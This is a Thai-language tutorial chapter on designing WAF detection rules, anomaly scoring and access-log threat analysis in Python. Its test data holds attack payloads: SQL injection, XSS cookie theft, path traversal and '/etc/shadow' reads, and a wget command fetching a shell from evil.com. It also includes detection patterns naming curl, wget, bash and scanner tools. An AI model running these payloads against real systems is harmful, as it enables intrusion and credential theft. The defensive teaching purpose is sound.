# Part 76: WAF Signature & Detection Pattern Analysis

> **ระดับ:** ผู้เชี่ยวชาญ | **เวลาเรียน:** ~90 นาที | **ข้อกำหนด:** Part 01-75
>
> **หมายเหตุ:** เนื้อหาส่วนนี้ใช้เพื่อ การพัฒนา WAF, Intrusion Detection Systems (IDS), และ การทำ Security Testing ที่ได้รับอนุญาต

---

## 76.1 WAF Rule Pattern Structure

```python
import re
from typing import Dict, List, Optional

print("WAF Signature & Detection Pattern Analysis:")
print("=" * 60)

print("\n1. ModSecurity-style rule patterns:")

# ModSecurity OWASP CRS pattern structure
# Simplified Python port for educational analysis

class WAFRule:
    """Simplified WAF rule representation for educational purposes."""
    def __init__(self, rule_id: int, phase: int, pattern: str,
                 flags: int, message: str, severity: str):
        self.rule_id  = rule_id
        self.phase    = phase
        self.pattern  = re.compile(pattern, flags)
        self.message  = message
        self.severity = severity

    def match(self, value: str) -> Optional[re.Match]:
        return self.pattern.search(value)


# Educational WAF rule set (simplified OWASP CRS-style)
WAF_RULES = [
    # SQLi rules
    WAFRule(941100, 2,
        r"(?:(?:[\s'\"\`\(\)]*?)\b(?:union|select|insert|update|delete|drop|create|alter|exec|execute|xp_|sp_)\b)",
        re.IGNORECASE, "SQL Injection Attack Detected", "CRITICAL"),

    WAFRule(941110, 2,
        r"(?:'|\"|\`)\s*(?:or|and)\s+(?:'|\"|\`|[0-9])",
        re.IGNORECASE, "SQL Injection (Tautology)", "CRITICAL"),

    WAFRule(941160, 2,
        r"\bUNION\b.{0,100}\bSELECT\b",
        re.IGNORECASE | re.DOTALL, "SQL UNION injection", "CRITICAL"),

    # XSS rules
    WAFRule(941200, 2,
        r"<\s*script\b[^>]*>|<\s*/\s*script\s*>",
        re.IGNORECASE, "XSS Script Tag", "CRITICAL"),

    WAFRule(941210, 2,
        r"\bon(?:load|error|click|mouseover|focus|blur|change|submit)\s*=",
        re.IGNORECASE, "XSS Event Handler", "CRITICAL"),

    WAFRule(941220, 2,
        r"(?:javascript|vbscript|data|livescript):",
        re.IGNORECASE, "XSS Protocol Handler", "HIGH"),

    # Path traversal rules
    WAFRule(930100, 1,
        r"\.\.[/\\]",
        0, "Path Traversal", "HIGH"),

    WAFRule(930110, 1,
        r"(?:%2e%2e[%2f%5c]|\.\.\.%2[fF]|\.\.\.%5[cC])",
        re.IGNORECASE, "Path Traversal (URL-encoded)", "HIGH"),

    # Command injection
    WAFRule(932100, 2,
        r"[;&|`]\s*(?:id|whoami|uname|pwd|ls|dir|cat|type|wget|curl|bash|sh|cmd|powershell)\b",
        re.IGNORECASE, "OS Command Injection", "CRITICAL"),

    WAFRule(932110, 2,
        r"\$\(|\$\{|`[^`]*`",
        0, "Shell Command Substitution", "HIGH"),
]


def waf_analyze(request_data: Dict[str, str]) -> List[Dict]:
    findings = []
    for param_name, param_value in request_data.items():
        for rule in WAF_RULES:
            m = rule.match(param_value)
            if m:
                findings.append({
                    'rule_id':  rule.rule_id,
                    'param':    param_name,
                    'severity': rule.severity,
                    'message':  rule.message,
                    'match':    m.group(0)[:40],
                })
    return findings


test_requests = [
    {'username': "admin' OR '1'='1", 'password': 'anything'},
    {'q': '<script>alert(document.cookie)</script>'},
    {'file': '../../../etc/passwd'},
    {'cmd': 'ls; cat /etc/shadow'},
    {'search': '1 UNION SELECT username,password FROM users--'},
    {'id': '1', 'name': 'Alice'},
    {'page': 'home', 'lang': 'en'},
]

print(f"\n   WAF analysis results:")
for req in test_requests:
    findings = waf_analyze(req)
    params = ', '.join(f"{k}={v[:20]!r}" for k, v in req.items())
    if findings:
        print(f"\n   Request: {params[:60]}")
        for f in findings:
            print(f"   ⚠ [{f['severity']}] Rule {f['rule_id']}: {f['message']}")
            print(f"     Match: {f['match']!r}")
    else:
        print(f"   ✓ CLEAN: {params[:60]}")
```

---

## 76.2 Anomaly Scoring & Threshold Rules

```python
import re
from typing import Dict, List, Tuple
from collections import defaultdict

print("\nAnomaly Scoring & Threshold Rules:")
print("=" * 60)

# Anomaly scores (similar to OWASP CRS scoring)
SEVERITY_SCORES = {
    'CRITICAL': 5,
    'HIGH':     4,
    'MEDIUM':   3,
    'LOW':      2,
    'INFO':     1,
}

INBOUND_THRESHOLD  = 10
OUTBOUND_THRESHOLD = 4


class AnomalyScorer:
    def __init__(self):
        self.rules = []

    def add_rule(self, pattern: str, severity: str, message: str, flags: int = 0):
        self.rules.append({
            'pattern':  re.compile(pattern, flags),
            'severity': severity,
            'score':    SEVERITY_SCORES[severity],
            'message':  message,
        })

    def score_request(self, inputs: Dict[str, str]) -> Dict:
        total_score = 0
        matched = []

        for param, value in inputs.items():
            for rule in self.rules:
                m = rule['pattern'].search(value)
                if m:
                    total_score += rule['score']
                    matched.append({
                        'param':   param,
                        'rule':    rule['message'],
                        'score':   rule['score'],
                        'match':   m.group(0)[:30],
                    })

        action = 'BLOCK' if total_score >= INBOUND_THRESHOLD else (
                 'WARN'  if total_score >= 3 else 'ALLOW')

        return {
            'total_score':  total_score,
            'threshold':    INBOUND_THRESHOLD,
            'action':       action,
            'matched':      matched,
        }


scorer = AnomalyScorer()

# Add rules with severity scores
scorer.add_rule(r"\bUNION\b.{0,100}\bSELECT\b", 'CRITICAL',
    "UNION SELECT injection", re.IGNORECASE | re.DOTALL)
scorer.add_rule(r"(?:'|\").*(?:OR|AND).*(?:'|\").*=", 'CRITICAL',
    "Boolean-based SQL injection", re.IGNORECASE)
scorer.add_rule(r"\bSLEEP\s*\(\d+\)", 'CRITICAL',
    "Time-based SQL injection", re.IGNORECASE)
scorer.add_rule(r"<\s*script\b", 'CRITICAL', "XSS script tag", re.IGNORECASE)
scorer.add_rule(r"\.\.[/\\]", 'HIGH', "Path traversal")
scorer.add_rule(r"[;&|`]", 'MEDIUM', "Shell metacharacter")
scorer.add_rule(r"\b(?:wget|curl|bash|sh)\b", 'HIGH',
    "System command", re.IGNORECASE)


requests_to_score = [
    {'q': 'hello world'},
    {'id': "1 OR 1=1"},
    {'id': "1 UNION SELECT table_name FROM information_schema.tables"},
    {'search': "<script>alert(1)</script>"},
    {'path': "../etc/passwd"},
    {'name': "Robert'; DROP TABLE students; --"},
    {'cmd': "id; wget http://evil.com/shell"},
    {'q': "python regex tutorial"},
]

print(f"\n   Anomaly scoring (threshold={INBOUND_THRESHOLD}):")
for req in requests_to_score:
    result = scorer.score_request(req)
    params = list(req.values())[0][:40]
    action = result['action']
    score  = result['total_score']
    marker = '🚨' if action == 'BLOCK' else ('⚠' if action == 'WARN' else '✓')
    print(f"\n   {marker} [{action}] Score={score} | {params!r}")
    for match in result['matched']:
        print(f"      {match['rule']} (+{match['score']}) → {match['match']!r}")
```

---

## 76.3 Request Rate & Behavioral Analysis

```python
import re
import time
from collections import defaultdict, deque
from typing import Dict, List, Optional

print("\nRequest Rate & Behavioral Analysis:")
print("=" * 60)

# Rate limiting patterns
class RateLimiter:
    def __init__(self, limit: int, window: float):
        self.limit   = limit
        self.window  = window
        self.buckets: Dict[str, deque] = defaultdict(deque)

    def check(self, key: str) -> Dict:
        now = time.monotonic()
        bucket = self.buckets[key]

        # Remove expired entries
        while bucket and bucket[0] < now - self.window:
            bucket.popleft()

        count = len(bucket)
        if count >= self.limit:
            return {
                'allowed': False,
                'count':   count,
                'limit':   self.limit,
                'window':  self.window,
            }

        bucket.append(now)
        return {
            'allowed': True,
            'count':   count + 1,
            'limit':   self.limit,
            'window':  self.window,
        }


# Suspicious request patterns for behavioral analysis
RAPID_404      = re.compile(r'HTTP/\d\.\d" 404')
SCAN_PATHS     = re.compile(
    r'/(?:\.git|\.env|backup|admin|wp-admin|phpinfo|config|database)',
    re.IGNORECASE
)
USER_AGENT_BOT = re.compile(
    r'\b(?:sqlmap|nikto|nmap|masscan|nessus|acunetix|burp|zap|dirbuster)\b',
    re.IGNORECASE
)

# Log entry pattern for behavioral analysis
ACCESS_LOG = re.compile(
    r'(?P<ip>[\d.]+)\s+-\s+-\s+'
    r'\[(?P<time>[^\]]+)\]\s+'
    r'"(?P<method>\w+)\s+(?P<path>\S+)\s+HTTP/[\d.]+"\s+'
    r'(?P<status>\d+)\s+'
    r'(?P<bytes>\d+|-)\s+'
    r'"(?P<referer>[^"]*)"\s+'
    r'"(?P<ua>[^"]*)"'
)


def analyze_access_log(log_lines: List[str]) -> Dict:
    stats = defaultdict(lambda: {'requests': 0, '404s': 0, 'scan_paths': 0, 'sus_ua': False})

    for line in log_lines:
        m = ACCESS_LOG.match(line)
        if not m:
            continue
        ip = m.group('ip')
        stats[ip]['requests'] += 1
        if m.group('status') == '404':
            stats[ip]['404s'] += 1
        if SCAN_PATHS.search(m.group('path')):
            stats[ip]['scan_paths'] += 1
        if USER_AGENT_BOT.search(m.group('ua')):
            stats[ip]['sus_ua'] = True

    threats = {}
    for ip, s in stats.items():
        score = 0
        reasons = []
        if s['404s'] > 5:
            score += 3
            reasons.append(f"404s={s['404s']}")
        if s['scan_paths'] > 2:
            score += 4
            reasons.append(f"scan_paths={s['scan_paths']}")
        if s['sus_ua']:
            score += 5
            reasons.append("scanner_ua")
        if score > 0:
            threats[ip] = {'score': score, 'reasons': reasons, 'reqs': s['requests']}

    return threats


sample_logs = [
    '192.168.1.100 - - [15/Feb/2024:10:00:01 +0700] "GET /index.html HTTP/1.1" 200 1234 "-" "Mozilla/5.0"',
    '10.0.0.5 - - [15/Feb/2024:10:00:02 +0700] "GET /.env HTTP/1.1" 404 0 "-" "sqlmap/1.7.8"',
    '10.0.0.5 - - [15/Feb/2024:10:00:03 +0700] "GET /admin HTTP/1.1" 404 0 "-" "sqlmap/1.7.8"',
    '10.0.0.5 - - [15/Feb/2024:10:00:04 +0700] "GET /wp-admin HTTP/1.1" 404 0 "-" "sqlmap/1.7.8"',
    '10.0.0.5 - - [15/Feb/2024:10:00:05 +0700] "GET /backup HTTP/1.1" 404 0 "-" "sqlmap/1.7.8"',
    '10.0.0.5 - - [15/Feb/2024:10:00:06 +0700] "GET /database HTTP/1.1" 404 0 "-" "sqlmap/1.7.8"',
    '192.168.1.100 - - [15/Feb/2024:10:00:07 +0700] "POST /api/login HTTP/1.1" 200 88 "-" "Mozilla/5.0"',
    '172.16.0.2 - - [15/Feb/2024:10:00:08 +0700] "GET /config HTTP/1.1" 404 0 "-" "Nikto/2.1.6"',
    '172.16.0.2 - - [15/Feb/2024:10:00:09 +0700] "GET /phpinfo.php HTTP/1.1" 404 0 "-" "Nikto/2.1.6"',
]

threats = analyze_access_log(sample_logs)
print(f"\n   Behavioral threat analysis:")
for ip, info in sorted(threats.items(), key=lambda x: -x[1]['score']):
    print(f"\n   IP: {ip}")
    print(f"   Score: {info['score']}, Requests: {info['reqs']}")
    print(f"   Reasons: {', '.join(info['reasons'])}")
```

---

## 76.4 สรุป Part 76

```
WAF Detection Pattern Design:

1. Rule structure (ModSecurity CRS style):
   Phase:    1=connection, 2=request headers+body, 3=response headers, 4=response body
   Operator: @rx (regex), @contains, @beginsWith, @endsWith
   Actions:  deny (block), log, pass, setvar (anomaly score)

2. Severity scoring (OWASP CRS):
   CRITICAL = 5 points (SQLi, RCE, XSS with script)
   HIGH     = 4 points (path traversal, XSS event handlers)
   MEDIUM   = 3 points (info disclosure patterns)
   LOW      = 2 points (minor policy violations)
   Threshold: inbound >= 10 = BLOCK

3. Core detection categories:
   SQLi:    UNION SELECT, OR 1=1, SLEEP(), stacked queries
   XSS:     <script>, on*=, javascript:, data:text/html
   LFI/RFI: ../, %2e%2e/, /etc/passwd, http://evil.com/
   CMDi:    ; id, | cat, && wget, $(id), `whoami`
   XXE:     <!ENTITY, SYSTEM "file://", PUBLIC

4. Behavioral analysis:
   Rate: > 100 req/min from same IP = suspicious
   404s: > 5 consecutive 404s = scan
   UA:   scanner strings in User-Agent
   Paths: /.env, /.git, /admin, /wp-config = probe

5. False positive reduction:
   Whitelist known good IPs (monitoring tools)
   Reduce score for authenticated sessions
   Context-aware rules (JSON body vs form data)
   Paranoia levels 1-4 in OWASP CRS
```

---

*[← Part 75: DNS & Network Patterns](part-75-dns-network.md) | [→ Part 77: Filter Bypass Techniques](part-77-filter-bypass.md)*
